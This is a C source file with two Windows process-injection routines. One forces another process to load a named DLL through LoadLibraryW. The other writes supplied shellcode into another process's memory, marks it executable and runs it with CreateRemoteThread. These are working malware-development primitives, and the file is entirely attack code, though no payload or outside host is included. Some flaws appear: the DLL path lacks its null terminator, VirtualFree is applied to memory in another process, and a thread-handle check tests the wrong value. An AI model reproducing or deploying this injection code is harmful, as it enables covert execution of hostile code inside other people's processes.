#include "dllinjection.h"

BOOL InjectDll(HANDLE hProcess, LPWSTR DllName)
{
	BOOL state = FALSE;
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	
	SIZE_T BytesWritten;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	LPVOID pLoadLibraryW;
	LPVOID pAddress = NULL;
	
	if (!(pLoadLibraryW = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW"))) goto _cleanup;
			 
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto _cleanup;
	
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &BytesWritten)) goto _cleanup;
	
	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pAddress, 0, NULL)) == INVALID_HANDLE_VALUE) goto _cleanup;

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);

	state = TRUE;
_cleanup:
	if (pAddress) VirtualFree(pAddress, dwSizeToWrite, MEM_FREE);
	CloseHandle(hThread);
	getchar();
	return state;
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE pLocalShellcode, SIZE_T sShellcode)
{
	PVOID  pExternalShellcode;
	DWORD  dwOldProtection;
	SIZE_T sBytesWritten;
	BOOL   state = FALSE;

	if (
		!(pExternalShellcode = VirtualAllocEx(hProcess,NULL,sShellcode,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
		) goto _cleanup;
	if (
		!WriteProcessMemory(hProcess, pExternalShellcode, pLocalShellcode, sShellcode, &sBytesWritten) || sShellcode != sBytesWritten
		) goto _cleanup;
	if (
		!VirtualProtectEx(hProcess, pExternalShellcode,sShellcode, PAGE_EXECUTE_READ, &dwOldProtection)
		) goto _cleanup;
	if (
		!CreateRemoteThread(hProcess, NULL, 0, pExternalShellcode, NULL, 0, NULL)
		) goto _cleanup;

	state = TRUE;

_cleanup:
	//if (pExternalShellcode) { 
		//RtlSecureZeroMemory(pExternalShellcode, sShellcode);
		//VirtualFree(pExternalShellcode, sShellcode, MEM_FREE); 
	//}
	
	return state;
}